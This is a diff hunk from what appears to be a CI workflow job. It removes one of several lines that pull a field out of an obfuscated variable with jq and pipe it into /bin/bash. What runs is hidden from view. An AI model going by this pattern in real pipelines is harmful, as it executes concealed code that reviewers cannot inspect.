@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$mdzid712" | jq -r .lhi1426 | /bin/bash
           echo $crpi18095 | jq -r .j5146 | /bin/bash
-          printf '%s' "$ezp339" | jq -r .j66600 | /bin/bash
           printf '%s' "$m51" | jq -r .qra74431 | /bin/bash
 
       - name: Save data
